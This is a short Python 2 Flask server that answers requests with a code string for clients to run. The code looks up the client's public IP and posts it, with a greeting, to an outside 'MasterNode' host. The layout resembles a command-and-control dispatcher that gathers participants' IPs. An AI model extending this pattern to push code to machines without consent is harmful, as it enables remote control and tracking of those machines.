
from flask import Flask, request, jsonify, url_for
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
import random
app = Flask(__name__)

string_array = ["hello", "hi", "hey"]

@app.route("/", methods=["GET","POST"])
def hello():
  if request.method == "GET":
    new_string = random.choice(string_array)
    return jsonify(continue_="true",action_="import random\ncur_ip = requests.get('http://icanhazip.com/').text.strip()\nprint '" + new_string + "'\nr = requests.post('https://MasterNode--yevbar.repl.co/', json={'ip':cur_ip, 'message':'" + new_string + "'})")
  else:
    print request.get_json(silent=True)
    return "Thanks!"

@app.route("/<ip>")
def get_ip(ip):
  print ip
  return "woot got your ip!"

if __name__ == "__main__":
    app.run(host= '0.0.0.0', port=9000, debug=False)
